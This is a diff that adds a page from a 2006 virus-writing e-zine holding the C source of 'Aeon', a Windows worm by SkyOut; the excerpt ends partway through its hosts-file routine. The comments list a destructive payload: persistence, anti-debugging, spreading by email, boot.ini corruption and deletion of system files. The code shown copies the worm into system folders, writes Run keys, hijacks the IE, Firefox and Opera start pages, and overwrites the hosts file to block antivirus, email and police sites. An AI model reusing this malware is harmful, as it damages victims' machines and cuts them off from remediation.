@@ -1,0 +1,1307 @@
+<html><head><title>EOF ISSUE #0x01</title>
+<style fprolloverstyle>A:hover {color: #D1F2C4; text-decoration: none}</style></head>
+<body text="#E0E0E0" bgcolor="#131313" link="#BFBFBF" vlink="#BFBFBF" alink="#BFBFBF" style="font-size: 10pt">
+
+<pre><hr>|| Author: SkyOut/EOF || <a style="text-decoration: none" href="../mainmenu/sources.htm"><span style="text-decoration: none">Back to sources</span></a> || <a style="text-decoration: none" target="_blank" href="../binsrc/SkyOut/Aeon"><span style="text-decoration: none; color: #BFBF88">View project folder</span></a> || <hr></pre>
+<pre>
+/*
+Payload of Aeon:
+
+- The worm is waiting for 5 minutes, before starting the code
+- Create a mutex to make sure the worm is only running once
+- Check for SoftIce/OllyDbg/FileMon/RegMon and exit virus if found
+- Change Name / Organisation values in Registry
+- Change settings to hide file extensions and don't show hidden files in explorer
+- Copy to different locations on PC and write Run value in HKEY_CURRENT_USER and HKEY_LOCAL_MACHINE
+- Drop a HTML-File into %sysdir% and change IE Start Page to it
+- Reset all individual settings of Firefox and change Start Page to the same HTML-File IE is using
+- Change Opera Start Page to the HTML-File as well and change the values of the installed Search Engines
+- Modify hosts and hosts.msn (by MSN Messenger) to make it impossible to connect to most AV related pages
+- Disable the MAPI Warning in Outlook to hide from user
+- Stay in background and try to spread via email every 60 seconds by creating a thread
+- Check the date, on the 1st, 14th and 28th run the Payload:
+	- Modify the &quot; boot.ini &quot; file, which will result in an error message before even starting the bootloader
+	- Change almost all file associations in HKEY_CLASSES_ROOT
+	- Set all system colors to black
+	- Change registry values opening a messagebox before login page can be reached
+	- Destroy various files listed in an array, which are located in %sysdir% and protected by windows
+	- Wait about 5 seconds and close the upcoming warning message on german and english windows versions (using window handle)
+	- Drop a batch file and open it several times
+	- Shut down the system finally
+
+=========================================================================
+=========================================================================
+
+	Author: SkyOut
+
+	Compiled with: -&gt; Visual C++ 2005 Express Edition
+				   -&gt; Microsoft PSDK for Windows Server 2003 R2
+
+	Finished: 09th August 2006 - 04:00 - GMT +01:00
+
+*/
+
+/* Defining Windows Version being WindowsXP (0x0501) */
+#define WIN32_WINNT 0x0501
+
+/* The headers we need for our virus */
+#include &lt;windows.h&gt;
+#include &lt;shellapi.h&gt;
+#include &lt;shlobj.h&gt;
+#include &lt;mapi.h&gt;
+
+/* Change the Name and Organization value of Windows, can be seen in System Information */
+void ChangeNameOrg(void)
+{
+	HKEY hKey;
+	char szOwner[] = &quot;SkyOut [ Aeon Virus ]&quot;;
+	char szOrganization[] = &quot;[ E - O - F ]&quot;;
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;RegisteredOwner&quot;, 0, REG_SZ, szOwner, sizeof(szOwner));
+	RegSetValueEx(hKey, &quot;RegisteredOrganization&quot;, 0, REG_SZ, szOrganization, sizeof(szOrganization));
+	RegCloseKey(hKey);
+}
+
+/* This will pop up a messagebox every time before user can login to Windows */
+void Messagebox(void)
+{
+	HKEY hKey;
+	char szCaption[] = &quot;SkyOut | Aeon Virus ]&quot;;
+	char szText[] = &quot;Your computer has been infected with the [Aeon] Virus -&gt; SkyOut -&gt; [Electrical Ordered Freedom]&quot;;
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;LegalNoticeCaption&quot;, 0, REG_SZ, szCaption, sizeof(szCaption));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;LegalNoticeText&quot;, 0, REG_SZ, szText, sizeof(szText));
+	RegCloseKey(hKey);
+}
+
+/* Files with file attribute hidden are invisible in explorer and file extensions are not shown as well */
+void MakeHidden(void)
+{
+	HKEY hKey;
+	DWORD dwNull = 0;
+	DWORD dwOne = 1;
+
+	RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Hidden&quot;, 0, REG_DWORD, (LPBYTE)&amp;dwNull, sizeof(DWORD));
+	RegSetValueEx(hKey, &quot;HideFileExt&quot;, 0, REG_DWORD, (LPBYTE)&amp;dwOne, sizeof(DWORD));
+	RegCloseKey(hKey);
+}
+
+/* Copy to 5 different locations in %sysdir% (hidden):
+	- %sysdir%
+	- %sysdir%\wbem
+	- %sysdir%\drivers
+	- %sysdir%\spool
+	- %sysdir%\oobe
+
+Then write Run entries for all files in:
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+*/
+void CopyToPC(void)
+{
+	HKEY hKey;
+	HMODULE Mod;
+	char szVirusPath[MAX_PATH];
+	char szSysDir1[MAX_PATH];
+	char szSysDir2[MAX_PATH];
+	char szSysDir3[MAX_PATH];
+	char szSysDir4[MAX_PATH];
+	char szSysDir5[MAX_PATH];
+
+	/* Get current location */
+	Mod = GetModuleHandle(NULL);
+	GetModuleFileName(Mod, szVirusPath, sizeof(szVirusPath));
+
+	/* Get the location of %sysdir% */
+	GetSystemDirectory(szSysDir1, sizeof(szSysDir1));
+	strcat_s(szSysDir1, MAX_PATH, &quot;\\Aeon.exe&quot;);
+
+	GetSystemDirectory(szSysDir2, sizeof(szSysDir2));
+	strcat_s(szSysDir2, MAX_PATH, &quot;\\wbem\\Aeon.exe&quot;);
+
+	GetSystemDirectory(szSysDir3, sizeof(szSysDir3));
+	strcat_s(szSysDir3, MAX_PATH, &quot;\\drivers\\Aeon.exe&quot;);
+
+	GetSystemDirectory(szSysDir4, sizeof(szSysDir4));
+	strcat_s(szSysDir4, MAX_PATH, &quot;\\spool\\Aeon.exe&quot;);
+
+	GetSystemDirectory(szSysDir5, sizeof(szSysDir5));
+	strcat_s(szSysDir5, MAX_PATH, &quot;\\oobe\\Aeon.exe&quot;);
+
+	/* Copy the file from its current location into the five locations ins %sysdir% */
+	CopyFile(szVirusPath, szSysDir1, FALSE);
+	CopyFile(szVirusPath, szSysDir2, FALSE);
+	CopyFile(szVirusPath, szSysDir3, FALSE);
+	CopyFile(szVirusPath, szSysDir4, FALSE);
+	CopyFile(szVirusPath, szSysDir5, FALSE);
+
+	/* Make sure HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run exists */
+	RegCreateKey(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, &amp;hKey);
+	RegCloseKey(hKey);
+
+	/* Make sure HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run exists */
+	RegCreateKey(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, &amp;hKey);
+	RegCloseKey(hKey);
+
+	/* Write Run values in HKEY_LOCAL_MACHINE */
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Aeon1&quot;, 0, REG_SZ, szSysDir1, strlen(szSysDir1));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Aeon2&quot;, 0, REG_SZ, szSysDir2, strlen(szSysDir2));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Aeon3&quot;, 0, REG_SZ, szSysDir3, strlen(szSysDir3));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Aeon4&quot;, 0, REG_SZ, szSysDir4, strlen(szSysDir4));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Aeon5&quot;, 0, REG_SZ, szSysDir5, strlen(szSysDir5));
+	RegCloseKey(hKey);
+
+	/* Write Run values in HKEY_CURRENT_USER */
+	RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Aeon1&quot;, 0, REG_SZ, szSysDir1, strlen(szSysDir1));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Aeon2&quot;, 0, REG_SZ, szSysDir2, strlen(szSysDir2));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Aeon3&quot;, 0, REG_SZ, szSysDir3, strlen(szSysDir3));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Aeon4&quot;, 0, REG_SZ, szSysDir4, strlen(szSysDir4));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Aeon5&quot;, 0, REG_SZ, szSysDir5, strlen(szSysDir5));
+	RegCloseKey(hKey);
+}
+
+/* Check if the PC is infected by checking HKEY_LOCAL_MACHINE\SYSTEM\Aeon for &quot; Aeon &quot; = &quot; Aeon &quot; */
+BOOL IsPCInfected()
+{
+	HKEY hKey;
+	char szBuf[MAX_PATH];
+	DWORD dwBufLength = sizeof(szBuf);
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;SYSTEM\\Aeon&quot;, 0, KEY_QUERY_VALUE, &amp;hKey);
+	RegQueryValueEx(hKey, &quot;Aeon&quot;, 0, NULL, szBuf, &amp;dwBufLength);
+	RegCloseKey(hKey);
+
+	if (szBuf[0]!='A' || szBuf[1]!='e' || szBuf[3]!='o' || szBuf[4]!='n')
+	{
+		return -1;
+	}
+	else
+	{
+		return 0;
+	}
+}
+
+/* Drop a HTML-File into %sysdir% and change Internet Explorer Start Page value in Registry to it */
+void IEStartPageBSoD(void)
+{
+	HKEY hKey;
+	HANDLE hFile;
+	DWORD dwNumberOfBytesWritten;
+	char szStartPage[MAX_PATH];
+
+	char szBSoD[] = &quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;=== Infected with the AEON Virus ===&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=\&quot;#0000AA\&quot;&gt;&quot;
+					&quot;&lt;h2&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;
+					&quot;&lt;center&gt;&lt;FONT style=\&quot;BACKGROUND-COLOR: #A9A9A9\&quot; color=\&quot;#000AA\&quot;&gt;Windows&lt;/FONT&gt;&lt;/center&gt;&lt;br&gt;&quot;
+					&quot;&lt;font face=\&quot;Courier New\&quot; color=\&quot;#FFFFFF\&quot;&gt;&lt;SPAN style=\&quot;font-size:12pt;\&quot;&gt;&quot;
+					&quot;&lt;center&gt;A fatal exception ERROR has occured at 0xEOF.&lt;br&gt;&lt;br&gt;&quot;
+					&quot;Your computer has been infected with the &lt;u&gt;AEON&lt;/u&gt; virus...&quot;
+					&quot;This screen might be the last you see for a while,&lt;br&gt;after finishing different operations,&lt;br&gt;&quot;
+					&quot;&lt;u&gt;AEON&lt;/u&gt; will start a countdown of 60 000 milliseconds, which are 60 seconds.&lt;br&gt;&quot;
+					&quot;After this 60 seconds the computer will be forced to poweroff.&lt;br&gt;&quot;
+					&quot;The moment this happened you won't be able to access your Windows any more,&lt;br&gt;&quot;
+					&quot;the bootloader can not be started and you will get an error message instead of a boot screen.&lt;br&gt;&quot;
+					&quot;And even if you would be able to access your machine after the shutdown,&lt;br&gt;&quot;
+					&quot;do not think anything will be as it was before, different things have been changed.&lt;br&gt;&quot;
+					&quot;&lt;br&gt;&lt;br&gt;[SkyOut]&lt;br&gt;[Electrical Ordered Freedom]&lt;/center&gt;&lt;/SPAN&gt;&lt;/h2&gt;&lt;/body&gt;&lt;/html&gt;&quot;;
+
+	GetSystemDirectory(szStartPage, sizeof(szStartPage));
+	strcat_s(szStartPage, MAX_PATH, &quot;\\BSoD.html&quot;);
+
+	/* Create a possible old file */
+	DeleteFile(szStartPage);
+
+	/* Create the new one */
+	hFile = CreateFile(szStartPage, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+	WriteFile(hFile, szBSoD, sizeof(szBSoD), &amp;dwNumberOfBytesWritten, NULL);
+	CloseHandle(hFile);
+
+	/* Write the needed Registry values in HKEY_CURRENT_USER and HKEY_LOCAL_MACHINE */
+	RegOpenKeyEx(HKEY_CURRENT_USER, &quot;Software\\Microsoft\\Internet Explorer\\Main&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Start Page&quot;, 0, REG_SZ, szStartPage, sizeof(szStartPage));
+	RegCloseKey(hKey);
+
+	RegOpenKeyEx(HKEY_LOCAL_MACHINE, &quot;Software\\Microsoft\\Internet Explorer\\Main&quot;, 0, KEY_SET_VALUE, &amp;hKey);
+	RegSetValueEx(hKey, &quot;Start Page&quot;, 0, REG_SZ, szStartPage, sizeof(szStartPage));
+	RegCloseKey(hKey);
+
+	/* Make the file hidden */
+	SetFileAttributes(szStartPage, FILE_ATTRIBUTE_HIDDEN);
+}
+
+/* Reset all Firefox settings and change the Start Page value in pref.js to the HTML-File dropped by IEStartPageBSoD() */
+void FirefoxStartPageBSoD(void)
+{
+	HANDLE hFile;
+	HANDLE hFind;
+    WIN32_FIND_DATA w32FD;
+	DWORD dwNumberOfBytesWritten;
+	char szProfileFolder[MAX_PATH];
+	char szProfileFolder2[MAX_PATH];
+	char szSysDir[MAX_PATH];
+	char szPrefJS[MAX_PATH]; 
+
+	/* Get the location of %sysdir% (normally C:\WINDOWS\system32) */
+	GetSystemDirectory(szSysDir, sizeof(szSysDir));
+
+	/* Create two lines of preferences, which should be set for Firefox:
+		- user_pref(&quot;browser.startup.homepage&quot;, &quot;file:///C:\WINDOWS\system32\BSoD.html&quot;);
+		- user_pref(&quot;general.useragent.override&quot;, &quot;[AEON] Virus - SkyOut - [Electrical Ordered Freedom]&quot;);
+	*/
+
+	strcpy_s(szPrefJS, MAX_PATH, &quot;user_pref(\&quot;browser.startup.homepage\&quot;, \&quot;file:///&quot;);
+	strcat_s(szPrefJS, MAX_PATH, szSysDir);
+	strcat_s(szPrefJS, MAX_PATH, &quot;\\BSoD.html\&quot;);\r\n&quot;);
+	/* Help -&gt; About Mozilla Firefox (Useragent string is changed) */
+	strcat_s(szPrefJS, MAX_PATH, &quot;user_pref(\&quot;general.useragent.override\&quot;, \&quot;[AEON] Virus - SkyOut - [Electrical Ordered Freedom]\&quot;);&quot;);
+
+	/* Get the location of APPDATA directory, normally C:\Documents and Settings\&lt;USERNAME&gt;\Application Data */
+	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szProfileFolder);
+	strcat_s(szProfileFolder, MAX_PATH, &quot;\\Mozilla\\Firefox\\Profiles&quot;);
+
+	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szProfileFolder2);
+	strcat_s(szProfileFolder2, MAX_PATH, &quot;\\Mozilla\\Firefox\\Profiles&quot;);
+
+    strcat_s(szProfileFolder, sizeof(szProfileFolder), &quot;\\*&quot;);
+
+	/* Search for the first file in the directory APPDATA\Mozilla\Firefox\Profiles, which is the directory containing all 
+	Firefox profiles */
+    hFind = FindFirstFile(szProfileFolder, &amp;w32FD);
+
+	do
+	{
+		/* If filename is &quot; . &quot; or &quot; .. &quot; just continue */
+		if (!((strcmp((char*) w32FD.cFileName, &quot;.&quot;) &amp;&amp; strcmp((char*) w32FD.cFileName, &quot;..&quot;))))
+		{
+			continue;
+		}
+
+		((strcpy_s(szProfileFolder, sizeof(szProfileFolder), szProfileFolder2)) &amp; (strcat_s(szProfileFolder, sizeof(szProfileFolder), &quot;\\&quot;)));
+        strcat_s(szProfileFolder, sizeof(szProfileFolder), w32FD.cFileName);
+
+		/* If we have found a directory (thats what we searh for) we go into it and overwrite the preferences file &quot; pref.js &quot; with
+		the two setting we created above, first time user will start Firefox will set several other setting and it will start with
+		a Mozilla Start Page */
+        if(w32FD.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) 
+		{
+            if ((SetCurrentDirectory(szProfileFolder)) != 0)
+			{
+				hFile = CreateFile(&quot;prefs.js&quot;, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+				WriteFile(hFile, szPrefJS, sizeof(szPrefJS), &amp;dwNumberOfBytesWritten, NULL);
+			}
+        }
+	}while(FindNextFile(hFind, &amp;w32FD));
+	/* Close handle when no files can be found anymore */
+	FindClose(hFind);
+}
+
+/* Change the Start Page value in opera6.ini to the HTML-File created by IEStartPageBSoD() and change all Search Engine values in search.ini */
+void OperaStartPageBSoD(void)
+{
+	char szProfileIni[MAX_PATH];
+	char szSearchIni[MAX_PATH];
+	char szSearchEngine[MAX_PATH];
+	char szSysDir[MAX_PATH];
+	int i;
+
+	/* APPDATA (look above function) -&gt; APPDATA\Opera\Opera\profile\opera6.ini, preferences file */
+	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szProfileIni);
+	strcat_s(szProfileIni, MAX_PATH, &quot;\\Opera\\Opera\\profile\\opera6.ini&quot;);
+
+	/* APPDATA (look above function) -&gt; APPDATA\Opera\Opera\profile\search.ini, file containing information about the Search Engnines */
+	SHGetFolderPath(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, szSearchIni);
+	strcat_s(szSearchIni, MAX_PATH, &quot;\\Opera\\Opera\\profile\\search.ini&quot;);
+
+	GetSystemDirectory(szSysDir, sizeof(szSysDir));
+	strcat_s(szSysDir, MAX_PATH, &quot;\\BSoD.html&quot;);
+
+	/* Change Start Page to the file created by IEStartPageBSoD() */
+	WritePrivateProfileString(&quot;User Prefs&quot;, &quot;Home URL&quot;, szSysDir, szProfileIni);
+	/* Value 2 means the Home URL specified location will be opened */
+	WritePrivateProfileString(&quot;User Prefs&quot;, &quot;Startup Type&quot;, &quot;2&quot;, szProfileIni);
+	/* No warning will be displayed if Opera is not the systems stanard browser */
+	WritePrivateProfileString(&quot;User Prefs&quot;, &quot;Show Default Browser Dialog&quot;, &quot;0&quot;, szProfileIni);
+
+	/* Overwrite Name / URL value for 50 Search Engines (Standard 35) */
+	for ( i = 1; i &lt; 51; i++)
+	{
+		sprintf_s(szSearchEngine, MAX_PATH, &quot;Search Engine %i&quot;, i);
+		WritePrivateProfileString(szSearchEngine, &quot;Name&quot;, &quot;AEON&quot;, szSearchIni);
+		WritePrivateProfileString(szSearchEngine, &quot;URL&quot;, &quot;AEON&quot;, szSearchIni);
+	}
+
+}
+
+/* Modify hosts and hosts.msn file in %sysdir%\drivers\etc\hosts to make it impossible to connect to most AV related pages */
+void ModifyHostFile(void)
+{
+	HANDLE hFile;
+	DWORD dwNumberOfBytesWritten;
+	char szHostFile[MAX_PATH];
+	char szHostFileMSN[MAX_PATH];
+
+	char szHost[] = &quot;# Copyright (c) 2006-? SkyOut [Electrical Ordered Freedom]\r\n&quot;
+					&quot;#o_O uhoh, your computer has been infected with the AEON virus and yeeha\r\n&quot;
+					&quot;#I changed this file to stop you from visiting some helpful sites...\r\n&quot;
+					&quot;#I'm evil, right?! Yeah... I know and I will burn in hell, but until then\r\n&quot;
+					&quot;#I will go on fucking up some nice shit -_-\r\n&quot;
+					&quot;\r\n&quot;
+					&quot;127.0.0.1		localhost\r\n&quot;
+					&quot;\r\n&quot;
+					&quot;# AntiVirus --- AntiVirus --- AntiVirus\r\n&quot;
+					&quot;#======================================\r\n&quot;
+					&quot;127.0.0.1		www.aladdin.de\r\n&quot;
+					&quot;127.0.0.1		www.ealaddin.com\r\n&quot;
+					&quot;127.0.0.1		www.asw.cz\r\n&quot;
+					&quot;127.0.0.1		www.avira.com\r\n&quot;
+					&quot;127.0.0.1		www.centralcommand.com\r\n&quot;
+					&quot;127.0.0.1		www.clamav.net\r\n&quot;
+					&quot;127.0.0.1		www.percomp.de\r\n&quot;
+					&quot;127.0.0.1		www.commandcom.com\r\n&quot;
+					&quot;127.0.0.1		www1.my-etrust.com\r\n&quot;
+					&quot;127.0.0.1		www.ca.com/offices/germany\r\n&quot;
+					&quot;127.0.0.1		www.ca.com\r\n&quot;
+					&quot;127.0.0.1		www.vet.com.au\r\n&quot;
+					&quot;127.0.0.1		www.cybersoft.com\r\n&quot;
+					&quot;127.0.0.1		www.nod32.de/home/home.php\r\n&quot;
+					&quot;127.0.0.1		www.nod32.com/home/home.htm\r\n&quot;
+					&quot;127.0.0.1		www.f-secure.com\r\n&quot;
+					&quot;127.0.0.1		www.finjan.com\r\n&quot;
+					&quot;127.0.0.1		www.fortinet.com\r\n&quot;
+					&quot;127.0.0.1		www.complex.is/cgi-bin/home_pager\r\n&quot;
+					&quot;127.0.0.1		www.gdata.de\r\n&quot;
+					&quot;127.0.0.1		www.ravantivirus.com\r\n&quot;
+					&quot;127.0.0.1		www.jakobsoftware.de\r\n&quot;
+					&quot;127.0.0.1		www.grisoft.com\r\n&quot;
+					&quot;127.0.0.1		www.antivir.de\r\n&quot;
+					&quot;127.0.0.1		www.hbedv.com\r\n&quot;
+					&quot;127.0.0.1		www.free-av.de\r\n&quot;
+					&quot;127.0.0.1		www.free-av.com\r\n&quot;
+					&quot;127.0.0.1		www.hauri-europe.com/default.aspx?NAV=000\r\n&quot;
+					&quot;127.0.0.1		www.hauri-europe.com/default.aspx?NAV=002\r\n&quot;
+					&quot;127.0.0.1		www.ikarus-software.at\r\n&quot;
+					&quot;127.0.0.1		www.kaspersky.com/de\r\n&quot;
+					&quot;127.0.0.1		www.kaspersky.com\r\n&quot;
+					&quot;127.0.0.1		www.mwti.de\r\n&quot;
+					&quot;127.0.0.1		www.msspl.co.in/index.asp\r\n&quot;
+					&quot;127.0.0.1		www.mitcom.de\r\n&quot;
+					&quot;127.0.0.1		www.dials.ru/english/home.htm\r\n&quot;
+					&quot;127.0.0.1		www.mks.com.pl/index-en.html\r\n&quot;
+					&quot;127.0.0.1		www.drsolomon.com\r\n&quot;
+					&quot;127.0.0.1		www.mcafee-at-home.com/international/germany\r\n&quot;
+					&quot;127.0.0.1		www.mcafeeathome.com\r\n&quot;
+					&quot;127.0.0.1		www.nai.com\r\n&quot;
+					&quot;127.0.0.1		www.norman.no/de\r\n&quot;
+					&quot;127.0.0.1		www.norman.com\r\n&quot;
+					&quot;127.0.0.1		www.promus.de\r\n&quot;
+					&quot;127.0.0.1		www.omegas.de\r\n&quot;
+					&quot;127.0.0.1		www.panda-software.de\r\n&quot;
+					&quot;127.0.0.1		www.pandasoftware.com\r\n&quot;
+					&quot;127.0.0.1		www.bitdefender.de\r\n&quot;
+					&quot;127.0.0.1		www.bitdefender.com\r\n&quot;
+					&quot;127.0.0.1		www.sophos.de\r\n&quot;
+					&quot;127.0.0.1		www.sophos.com\r\n&quot;
+					&quot;127.0.0.1		www.sybari.com/default.aspx?alias=de-DE\r\n&quot;
+					&quot;127.0.0.1		www.sybari.com\r\n&quot;
+					&quot;127.0.0.1		www.symantec.de\r\n&quot;
+					&quot;127.0.0.1		www.symantec.com\r\n&quot;
+					&quot;127.0.0.1		www.trendmicro.de\r\n&quot;
+					&quot;127.0.0.1		www.antivirus.com\r\n&quot;
+					&quot;127.0.0.1		www.virusbuster.de\r\n&quot;
+					&quot;127.0.0.1		www.virusbuster.hu/index.en.ie.shtml\r\n&quot;
+					&quot;\r\n&quot;
+					&quot;# Desktop Firewall --- Desktop Firewall --- Desktop Firewall\r\n&quot;
+					&quot;#===========================================================\r\n&quot;
+					&quot;127.0.0.1		www.agnitum.com\r\n&quot;
+					&quot;127.0.0.1		www.aladdin.de\r\n&quot;
+					&quot;127.0.0.1		www.ealaddin.com\r\n&quot;
+					&quot;127.0.0.1		www.lockdowncorp.com\r\n&quot;
+					&quot;127.0.0.1		www.mcafee.de\r\n&quot;
+					&quot;127.0.0.1		www.mcafee.com\r\n&quot;
+					&quot;127.0.0.1		www.networkice.com\r\n&quot;
+					&quot;127.0.0.1		www.sygate.com\r\n&quot;
+					&quot;127.0.0.1		www.tinysoftware.com\r\n&quot;
+					&quot;127.0.0.1		www.zonelabs.com\r\n&quot;
+					&quot;\r\n&quot;
+					&quot;# AntiTrojan --- AntiTrojan --- AntiTrojan\r\n&quot;
+					&quot;#=========================================\r\n&quot;
+					&quot;127.0.0.1		www.anti-trojan.net\r\n&quot;
+					&quot;127.0.0.1		www.astonsoft.com\r\n&quot;
+					&quot;127.0.0.1		tds.diamondcs.com.au\r\n&quot;
+					&quot;127.0.0.1		www.mischel.dhs.org\r\n&quot;
+					&quot;127.0.0.1		www.moosoft.com\r\n&quot;
+					&quot;127.0.0.1		www.nsclean.com\r\n&quot;
+					&quot;\r\n&quot;
+					&quot;# VirusInfo --- VirusInfo --- VirusInfo\r\n&quot;
+					&quot;#======================================\r\n&quot;
+					&quot;127.0.0.1		www.antivirus-online.de\r\n&quot;
+					&quot;127.0.0.1		antivirus.about.com\r\n&quot;
+					&quot;127.0.0.1		www.avien.org\r\n&quot;
+					&quot;127.0.0.1		www.eicar.org\r\n&quot;
+					&quot;127.0.0.1		www.tu-berlin.de/www/software/hoax.shtml\r\n&quot;
+					&quot;127.0.0.1		www.vmyths.com\r\n&quot;
+					&quot;127.0.0.1		www.trojaner-info.de/inhalt.shtml\r\n&quot;
+					&quot;127.0.0.1		www.virusbtn.com\r\n&quot;
+					&quot;127.0.0.1		www.wildlist.org\r\n&quot;
+					&quot;\r\n&quot;
+					&quot;# Virus Libraries --- Virus Libraries --- Virus Libraries\r\n&quot;
+					&quot;#========================================================\r\n&quot;
+					&quot;127.0.0.1		www.europe.datafellows.com/virus-info\r\n&quot;
+					&quot;127.0.0.1		www.percomp.de/virusinformationen.html\r\n&quot;
+					&quot;127.0.0.1		www.ikarus-software.at/portal/modules.php?name=Virenlexikon\r\n&quot;
+					&quot;127.0.0.1		www.ravantivirus.com/pages/virus.php\r\n&quot;
+					&quot;127.0.0.1		www.symantec.com/avcenter/vinfodb.html\r\n&quot;
+					&quot;127.0.0.1		www.sophos.de/virusinfo/analyses\r\n&quot;
+					&quot;127.0.0.1		www.trendmicro.com/vinfo\r\n&quot;
+					&quot;127.0.0.1		vil.nai.com/vil/default.asp\r\n&quot;
+					&quot;127.0.0.1		www.viruslist.com/eng/viruslist.asp&quot;
+					&quot;\r\n&quot;
+					&quot;# Email Providers --- Email Providers --- Email Providers\r\n&quot;
+					&quot;#========================================================\r\n&quot;
+					&quot;127.0.0.1		www.web.de\r\n&quot;
+					&quot;127.0.0.1		www.gmx.net\r\n&quot;
+					&quot;127.0.0.1		www.lycos.de\r\n&quot;
+					&quot;127.0.0.1		www.arcor.de\r\n&quot;
+					&quot;127.0.0.1		www.freenet.de\r\n&quot;
+					&quot;127.0.0.1		www.yahoo.com\r\n&quot;
+					&quot;127.0.0.1		www.aol.com\r\n&quot;
+					&quot;127.0.0.1		www.t-online.de\r\n&quot;
+					&quot;\r\n&quot;
+					&quot;# Police --- Police --- Police\r\n&quot;
+					&quot;#=============================\r\n&quot;
+					&quot;127.0.0.1		www.fbi.gov\r\n&quot;
+					&quot;127.0.0.1		www.interpol.int\r\n&quot;
+					&quot;127.0.0.1		www.cia.gov\r\n&quot;
+					&quot;127.0.0.1		www.polizei.de\r\n&quot;
+					&quot;127.0.0.1		www.bka.de\r\n&quot;;
+
+	/* %sysdir%\drvers\etc\hosts */
+	GetSystemDirectory(szHostFile, sizeof(szHostFile));
+	strcat_s(szHostFile, MAX_PATH, &quot;\\drivers\\etc\\hosts&quot;);
+
+	/* %sysdir%\drvers\etc\hosts.msn */
+	GetSystemDirectory(szHostFileMSN, sizeof(szHostFileMSN));
+	strcat_s(szHostFileMSN, MAX_PATH, &quot;\\drivers\\etc\\hosts.msn&quot;);
+
+	/* Overwrite both files */
+	hFile = CreateFile(szHostFile, GENERIC_WRITE|GENERIC_READ, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
